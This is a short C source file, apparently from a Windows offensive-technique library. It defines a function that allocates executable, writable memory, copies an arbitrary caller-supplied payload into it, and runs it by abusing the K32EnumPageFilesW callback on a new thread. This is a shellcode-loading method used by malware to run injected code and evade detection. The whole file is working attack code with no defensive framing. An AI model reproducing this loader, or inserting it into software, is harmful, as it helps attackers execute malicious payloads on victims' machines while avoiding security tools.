#include "Win32Helper.h"

VOID InvokeK32EnumPageFilesWCallbackRoutine(LPVOID lpParameter)
{
	K32EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)lpParameter, NULL);
}

BOOL MpfSceViaK32EnumPageFilesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeK32EnumPageFilesWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}